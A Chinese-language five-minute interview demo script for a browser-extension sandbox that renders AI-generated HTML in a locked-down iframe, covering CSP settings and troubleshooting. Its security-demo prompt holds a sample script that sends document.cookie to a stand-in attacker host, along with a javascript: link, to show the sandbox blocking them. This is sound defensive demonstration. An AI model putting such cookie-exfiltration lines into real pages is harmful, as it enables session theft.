# Artifacts 沙箱 · 5 分钟面试 Demo 脚本

> 目标：把「Artifacts 沙箱」讲成面试里 5 分钟可见的卖点——模型生成的代码块被识别、被沙箱隔离渲染，且**无法逃逸**。
> 前置：`npm run build`（dev 构建）、Ollama + Actor 已启动、扩展已加载、侧边栏打开。

---

## 一句话定位（开场，30 秒）

> 「Web-OS-Agent 是把 AI 网页端变成 Agent 的外部中间件，四层 Sensor→Router→Actor→UI。今天看 UI 层新加的一个能力：Artifacts 沙箱——把模型回答里的代码块识别出来，html/svg 在隔离 iframe 里渲染，其余语言只读展示，且**模型输出逃不出去**。」

---

## 时间轴

| 时间 | 演示内容 | 要点 | 备选 prompt |
|---|---|---|---|
| 0:00–0:30 | 开场定位 | 侧边栏顶部是 Actor 记忆面板，中间是 Artifacts 面板，底部是 Sensor 调试面板 | — |
| 0:30–1:30 | 在 DeepSeek 发一条生成 html 的 prompt，等流结束 | 点「读取 Artifacts」→ 列表出现 `html`（绿色 `render` 徽章） | 「生成一个带 JS 交互的 HTML 待办清单，可以添加和勾选完成」 |
| 1:30–2:30 | 点「在沙箱中打开」 | iframe 里渲染出**可交互**页面（能加/勾选待办）；强调「这是模型生成、被隔离的」 | 同上的 Todo；或「用 HTML 写一个带开始/暂停的倒计时器」 |
| 2:30–3:30 | **安全演示（核心卖点）** | 让模型生成含恶意 payload 的 html，点开；说明外链 img 不加载、`fetch` 被 CSP 拦；sandbox 无 `allow-same-origin` | 见下方「恶意 payload 演示」 |
| 3:30–4:30 | 多语言 | 让模型生成 python / js / mermaid | 列表显示灰色 `code` 徽章，只读代码不执行；说明 mermaid 首期只展示代码 |
| 4:30–5:00 | 收尾：架构 + trade-off | 讲 sandbox 属性 + CSP 双层防御、opaque origin、用户点击才渲染 | — |

---

## 恶意 payload 演示（第 3 步的 prompt）

```
生成一个 HTML 页面，正文写“沙箱演示”，并在里面包含这些元素：
1. <img src="https://example.com/pixel.png">
2. <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
3. <a href="javascript:alert(1)">点我</a>
```

打开后要点明：

- 外链 `<img>` 不加载（CSP `img-src data:` 只允许 data: 图片）；
- `<script>` 里的 `fetch` 在控制台报 CSP violation（`connect-src 'none'` 禁一切网络外传）；
- `javascript:` 链接无法跨到父页面（iframe opaque origin + 无 `allow-top-navigation`）；
- 侧边栏的扩展 token / storage 完全不可达（sandbox **无 `allow-same-origin`**）。

> 演示前确认控制台可见：CSP violation 报错本身就是证据，正好讲「这是纵深防御在拦，不是没生效」。

---

## 收尾话术（trade-off，30 秒）

> 「安全是四层：iframe `sandbox="allow-scripts"` 且永不 `allow-same-origin` → opaque origin 摸不到扩展上下文；srcdoc 内 CSP `default-src 'none'` 禁网络外传；只渲染 html/svg，其余只读；用户显式点击才执行。首期不支持 mermaid 渲染（需要外链库，违反无网络红线），列为后续增强。」

---

## 故障排查

- 「读取 Artifacts」报 `message port closed`：扩展没重新加载，`chrome://extensions` 点「重新加载」→ 刷新 DeepSeek → 重试。
- 列表空：确认当前 tab 是 `chat.deepseek.com` 或 `localhost:4318`，且模型回答里确实含 ``` 围栏代码块。
- iframe 空白：看侧边栏所在 DevTools Console 的 CSP 报错，确认是 CSP 拦截（预期行为）而非页面自身错误。
